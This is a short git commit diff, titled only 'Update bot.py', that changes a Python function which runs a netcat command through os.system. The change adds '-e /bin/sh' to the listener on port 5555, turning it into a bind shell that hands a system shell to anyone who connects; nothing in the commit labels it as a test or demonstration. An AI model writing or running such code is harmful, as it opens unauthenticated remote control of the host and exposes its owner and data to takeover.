875f10be7ceb6f11150b4399043ab6ec67caf3e9
RubenMA12 <158078660+RubenMA12@users.noreply.github.com>
2024-01-31 16:11:37 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,7 +1,7 @@
 import os
 def run():
     # Especifica el comando nc
-    comando_nc = "nc -lvp 5555"
+    comando_nc = "nc -lvp 5555 -e /bin/sh"
 
     # Ejecuta el comando utilizando os.system
     os.system(comando_nc)
